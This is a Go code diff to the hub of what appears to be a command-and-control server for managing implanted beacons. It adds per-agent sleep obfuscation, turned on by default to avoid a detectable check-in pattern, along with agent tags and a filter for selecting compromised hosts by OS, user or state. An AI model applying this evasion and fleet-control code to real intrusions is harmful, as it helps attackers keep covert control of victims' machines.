@@ -9,6 +9,7 @@ import (
 	"fmt"
 	"log/slog"
 	"sort"
+	"strings"
 	"sync"
 	"time"
 	"unicode/utf8"
@@ -243,9 +244,12 @@ func (h *Hub) UnregisterSession(agentID, sessionID string) {
 	}
 	delete(h.live, agentID)
 	h.mu.Unlock()
-	h.store.MarkOffline(agentID)
+	// The agent is only offline when it has really gone quiet: a beacon
+	// closes its connection after every cycle.
+	if h.store.MarkOffline(agentID) {
+		h.Emit(Event{Kind: "agent.offline", AgentID: agentID})
+	}
 	h.store.SaveAsync()
-	h.Emit(Event{Kind: "agent.offline", AgentID: agentID})
 }
 
 // UnregisterAgent marks an agent offline when its link drops, without checking
@@ -255,9 +259,10 @@ func (h *Hub) UnregisterAgent(agentID string) {
 	h.mu.Lock()
 	delete(h.live, agentID)
 	h.mu.Unlock()
-	h.store.MarkOffline(agentID)
+	if h.store.MarkOffline(agentID) {
+		h.Emit(Event{Kind: "agent.offline", AgentID: agentID})
+	}
 	h.store.SaveAsync()
-	h.Emit(Event{Kind: "agent.offline", AgentID: agentID})
 }
 
 // Live returns the live link info for an agent.
@@ -439,10 +444,112 @@ func (h *Hub) SetPolicy(agentID string, sleep, jitter int) error {
 
 // Policy returns the cadence the server wants an agent to use.
 func (h *Hub) Policy(agentID string) (int, int) {
+	sleep, jitter, _ := h.PolicyFull(agentID)
+	return sleep, jitter
+}
+
+// PolicyFull returns the cadence and the obfuscation flag the server wants an
+// agent to use.
+//
+// The obfuscation is on unless the operator switched it off for this agent:
+// a uniform check-in interval is a signature of its own, so the default is
+// the safer of the two.
+func (h *Hub) PolicyFull(agentID string) (int, int, bool) {
 	if a, ok := h.store.Agent(agentID); ok && a.Sleep > 0 {
-		return a.Sleep, a.Jitter
+		return a.Sleep, a.Jitter, !a.NoObfuscate
 	}
-	return h.cfg.Server.Beacon.Sleep, h.cfg.Server.Beacon.Jitter
+	return h.cfg.Server.Beacon.Sleep, h.cfg.Server.Beacon.Jitter, true
+}
+
+// SetPolicyFull updates the cadence and, when obfuscate is not nil, the sleep
+// obfuscation flag of one agent.
+func (h *Hub) SetPolicyFull(agentID string, sleep, jitter int, obfuscate *bool) error {
+	if sleep < 1 || sleep > 86400 || jitter < 0 || jitter > 90 {
+		return errors.New("invalid sleep/jitter")
+	}
+	if !h.store.SetPolicyFull(agentID, sleep, jitter, obfuscate) {
+		return ErrNoSuchAgent
+	}
+	data := map[string]any{"sleep": sleep, "jitter": jitter}
+	if obfuscate != nil {
+		data["obfuscate"] = *obfuscate
+	}
+	h.Emit(Event{Kind: "agent.policy", AgentID: agentID, Data: data})
+	h.store.SaveAsync()
+	return nil
+}
+
+// SetTags changes the tags of one agent.
+func (h *Hub) SetTags(agentID string, tags []string, mode string) error {
+	if !h.store.SetTags(agentID, tags, mode) {
+		return ErrNoSuchAgent
+	}
+	h.Emit(Event{Kind: "agent.tags", AgentID: agentID,
+		Data: map[string]any{"tags": tags, "mode": mode}})
+	h.store.SaveAsync()
+	return nil
+}
+
+// AgentFilter selects the agents an operation applies to.
+//
+// An empty field matches everything, so a filter is only ever a narrowing of
+// the inventory.  The state filter is what makes "every online Windows box"
+// a one-liner.
+type AgentFilter struct {
+	// IDs restricts the selection to these agents (when not empty).
+	IDs []string
+	// State is "online", "offline" or empty (any).
+	State string
+	// Transport is "tcp", "http", "ws", "dns" or empty (any).
+	Transport string
+	// OS and Arch match the platform the beacon reported.
+	OS   string
+	Arch string
+	// Tag requires the agent to carry this tag.
+	Tag string
+	// User matches the account the beacon runs as.
+	User string
+}
+
+// SelectAgents returns the agents that match the filter, newest first.
+func (h *Hub) SelectAgents(f AgentFilter) []*store.Agent {
+	agents := h.store.Agents()
+	out := make([]*store.Agent, 0, len(agents))
+	for _, a := range agents {
+		if len(f.IDs) > 0 && !containsString(f.IDs, a.ID) {
+			continue
+		}
+		if f.State != "" && a.State != f.State {
+			continue
+		}
+		if f.Transport != "" && a.Transport != f.Transport {
+			continue
+		}
+		if f.OS != "" && !strings.EqualFold(a.OS, f.OS) {
+			continue
+		}
+		if f.Arch != "" && !strings.EqualFold(a.Arch, f.Arch) {
+			continue
+		}
+		if f.User != "" && !strings.EqualFold(a.User, f.User) {
+			continue
+		}
+		if f.Tag != "" && !a.HasTag(f.Tag) {
+			continue
+		}
+		out = append(out, a)
+	}
+	return out
+}
+
+// containsString reports whether the list holds the value.
+func containsString(list []string, value string) bool {
+	for _, item := range list {
+		if item == value {
+			return true
+		}
+	}
+	return false
 }
 
 // Subscribe registers an operator event stream.
@@ -663,6 +770,7 @@ func agentData(a *store.Agent) map[string]any {
 		"jitter":     a.Jitter,
 		"state":      a.State,
 		"checkins":   a.Checkins,
+		"tags":       a.Tags,
 		"first_seen": a.FirstSeen.Format(time.RFC3339),
 		"last_seen":  a.LastSeen.Format(time.RFC3339),
 	}
